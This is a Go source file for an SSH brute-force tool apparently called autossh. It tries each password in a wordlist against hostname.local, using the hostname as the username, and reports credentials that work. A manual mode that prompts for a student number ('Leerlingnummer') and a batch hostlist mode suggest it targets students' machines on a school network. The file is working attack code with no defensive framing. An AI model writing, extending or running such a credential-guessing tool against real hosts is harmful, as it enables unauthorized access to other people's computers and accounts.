package main

import (
	"fmt"
	"log"
	"math"
	"os"

	"github.com/cfschilham/autossh/internal/loadcfg"
	"github.com/cfschilham/autossh/internal/sshconn"
)

func dictAttack(hostname string, dict *loadcfg.Dict, verbose bool) {
	if !verbose {
		fmt.Printf("Attempting to connect to '%s'\n", hostname+"@"+hostname+".local:22")
	}

	for _, pwd := range dict.Pwds() {
		if verbose {
			fmt.Printf("Attempting to establish SSH connection at '%s' using password '%s'\n", hostname+"@"+hostname+".local:22", pwd)
		}
		if err := sshconn.SSHConn(hostname+".local:22", hostname, pwd, ""); err != nil {
			if verbose {
				log.Println("failed to connect: " + err.Error())
			}
		} else {
			fmt.Println("Connection successfully established!")
			fmt.Printf("Host: '%s' | Pass: '%s'\n", hostname+"@"+hostname+".local", pwd)
			break
		}
	}

	if !verbose {
		fmt.Println("Host not vulnerable")
	}
}

func main() {
	fmt.Println("Loading cfg/config.yml...")
	config, err := loadcfg.LoadConfig()
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Printf("Loading %s...\n", config.DictPath())
	dict, err := loadcfg.LoadDict("../" + config.DictPath())
	if err != nil {
		log.Fatalln(err)
	}

	switch config.Mode() {
	case "manual":
		var hostname string
		for {
			fmt.Print("Leerlingnummer (type 'exit' to exit): ")
			fmt.Scanln(&hostname)
			if hostname == "exit" {
				os.Exit(0)
			}
			dictAttack(hostname, dict, config.Verbose())
		}

	case "hostlist":
		fmt.Printf("Loading %s...\n", config.HostlistPath())
		hostlist, err := loadcfg.LoadHostlist("../" + config.HostlistPath())
		if err != nil {
			log.Fatalln(err)
		}

		for i, hostname := range hostlist.Hosts() {
			fmt.Printf("Hostlist %d%% complete\n", int(math.Round(float64(i)/float64(len(hostlist.Hosts()))*100)))
			dictAttack(hostname, dict, config.Verbose())
		}
		fmt.Println("Hostlist 100% complete")

	case "json":
		log.Fatalf("cfg/config.yml: mode '%s' is not supported yet!", config.Mode())
	default:
		log.Fatalf("cfg/config.yml: mode '%s' does not exist!", config.Mode())
	}
}
